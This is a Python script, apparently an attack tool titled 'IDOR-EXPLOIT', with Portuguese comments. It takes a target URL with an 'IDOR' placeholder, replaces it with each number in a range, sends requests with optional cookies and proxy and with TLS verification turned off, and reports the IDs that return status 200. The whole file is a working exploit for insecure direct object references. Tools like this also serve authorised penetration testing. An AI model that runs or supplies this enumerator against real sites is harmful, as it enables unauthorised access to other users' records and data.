import requests
import time
import warnings
from colorama import init, Fore, Style
import ast
import regex

Mblack = '\033[1;30m'   # Preto
Ired = '\033[1;31m'     # Vermelho
Dgreen = '\033[1;32m'   # Verde
Nyellow = '\033[1;33m'  # Amarelo
Iblue = '\033[1;34m'    # Azul
Gpurple = '\033[1;35m'  # Roxo
Hcyan = '\033[1;36m'    # Ciano
Twhite = '\033[1;37m'   # Branco
VRCRM = '\033[0;0m'     # Remover

init(autoreset=True)
warnings.simplefilter("ignore")

class target:
    def __init__(self, url, method, payload_type, *args, **kwargs):
        print("_" * 100)
        self.url = url
        self.method = method
        self.payload_type = payload_type
        self.headers = {}
        self.proxies = {}

        if kwargs.get('cookies') != None:
            self.headers.update({"Cookie": kwargs.get('cookies')})

        if kwargs.get('proxy') != None:
            self.proxies["http"] = "http://" + kwargs.get('proxy')
            self.proxies["https"] = "http://" + kwargs.get('proxy')

        if kwargs.get('headers') != None:
            self.headers.update(ast.literal_eval(kwargs.get('headers')))

        if kwargs.get('post_data') != None:
            self.post_data = kwargs.get('post_data')
            if len(regex.compile(r'\{(?:[^{}]|(?R))*\}').findall(self.post_data)) >= 1:
                self.headers['Content-Type'] = 'application/json'
        else:
            self.post_data = ""

        if kwargs.get('delay') != None:
            self.time = int(kwargs.get('delay'))
        else:
            self.time = 0

    @staticmethod
    def present(count, request, method, payload):
        print("| {} | {} | {} | {} | {} | {} |".format(count, payload, method.upper(), request.url, request.status_code, len(request.content)))

    def prepare(self):
        if self.payload_type == 'num':
            self.min_value = int(input("     {}>>{} {}Start value:{} ".format(Fore.BLUE, Style.RESET_ALL, Fore.WHITE, Style.RESET_ALL)))
            self.max_value = int(input("     {}>>{} {}End value:{} ".format(Fore.BLUE, Style.RESET_ALL, Fore.WHITE, Style.RESET_ALL)))
            if self.min_value >= self.max_value:
                print("|{}[ERROR]{} The start value is lower or equal the final value!".format(Fore.RED, Style.RESET_ALL))
                return False
            else:
                self.requests_number = (self.max_value + 1) - self.min_value
                return True

        if self.payload_type == 'list':
            file = input("     {}>>{} {}File list:{} ".format(Fore.BLUE, Style.RESET_ALL, Fore.WHITE, Style.RESET_ALL))
            try:
                opened_file = open(file, 'r')
                self.list = opened_file.readlines()
                self.requests_number = len(self.list)
                return True
            except:
                print("|{}[ERROR]{} Couldn't access the file!".format(Fore.RED, Style.RESET_ALL))
                return False

    def explore(self):
        print("_" * 100)
        print("| {}PUBLIC IP IN USE{} {}".format(Fore.WHITE, Style.RESET_ALL, requests.get('https://api.ipify.org').text))
        print("| {}METHOD{} {}".format(Fore.WHITE, Style.RESET_ALL, self.method.upper()))
        print("| {}URL{}  {}".format(Fore.WHITE, Style.RESET_ALL, self.url))
        print("| {}PAYLOAD{} {} | {} {} REQUESTS{}".format(Fore.WHITE, Style.RESET_ALL, self.payload_type.upper(), self.requests_number, Fore.WHITE, Style.RESET_ALL))
        print("| {}TIME BETWEEN REQUESTS{} {} {}seconds".format(Fore.WHITE, Style.RESET_ALL, self.time, Fore.WHITE))
        if len(self.proxies) == 2:
            print("| {}PROXY{} {}".format(Fore.WHITE, Style.RESET_ALL, self.proxies['http']))
        input("       Press ENTER to start...")
        print("| ID | PAYLOAD | METHOD | URL | STATUS | SIZE |")

        count = 0
        valid_ids = []
        if self.payload_type == 'num':
            for payload_number in range(self.min_value, self.max_value + 1):
                url = self.url.replace("IDOR", str(payload_number))
                try:
                    new_data = str(self.post_data)
                    defined_data = new_data.replace("IDOR", str(payload_number))
                except:
                    defined_data = ""
                request = requests.request(self.method, url, headers=self.headers, proxies=self.proxies, verify=False, data=defined_data)
                count += 1
                target.present(count, request, self.method, payload_number)
                if request.status_code == 200:
                    valid_ids.append(payload_number)
                time.sleep(self.time)

        print("_" * 100)
        print("Valid IDs found: ", valid_ids)

# Obter a URL do usuário
print(f'''{Ired}
  _____ _____   ____  _____        ________   _______  _      ____ _____ _______
 |_   _|  __ \ / __ \|  __ \      |  ____\ \ / /  __ \| |    / __ \_   _|__   __|
   | | | |  | | |  | | |__) |_____| |__   \ V /| |__) | |   | |  | || |    | |
   | | | |  | | |  | |  _  /______|  __|   > < |  ___/| |   | |  | || |    | |
  _| |_| |__| | |__| | | \ \      | |____ / . \| |    | |___| |__| || |_   | |
 |_____|_____/ \____/|_|  \_\     |______/_/ \_\_|    |______\____/_____|  |_|


{VRCRM}''')
print(f"\nEX:{Gpurple}http://site.com.br/archives/view.php?id=IDOR{VRCRM}")
url = input("Enter the target URL (including 'IDOR' as a placeholder): ")

# Configuração do teste
method = "GET"
payload_type = "num"

# Criação do objeto target
t = target(url, method, payload_type)
if t.prepare():
    t.explore()
